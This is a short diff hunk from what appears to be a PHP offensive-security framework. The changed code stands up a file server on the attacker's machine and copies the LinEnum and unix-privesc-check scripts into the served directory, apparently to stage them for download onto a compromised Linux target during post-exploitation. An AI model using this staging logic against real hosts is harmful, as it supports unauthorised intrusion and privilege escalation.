@@ -144,10 +144,9 @@ https://github.com/GDSSecurity/Windows-Exploit-Suggester
     $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
     if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
     else {
-        $port_rev = $this->port_rfi+1;
-        $open_server = "cd $this->dir_tmp; python -m SimpleHTTPServer $port_rev ";
-        $this->cmd("localhost",$open_server );
-        if (!$this->tcp2open($this->ip4addr4target($this->ip), $port_rev)) {$this->rouge($open_server);exit();}
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $this->tcp2open4server($attacker_ip, $this->port_rfi);
+        
         if (!file_exists("$this->dir_tmp/LinEnum.sh")) $this->requette("cp -v $this->dir_tools/enum/linux/LinEnum.sh $this->dir_tmp/LinEnum.sh ");
         if (!file_exists("$this->dir_tmp/unix-privesc-check.sh")) $this->requette("cp -v $this->dir_tools/enum/linux/unix-privesc-check.sh $this->dir_tmp/unix-privesc-check.sh ");
         
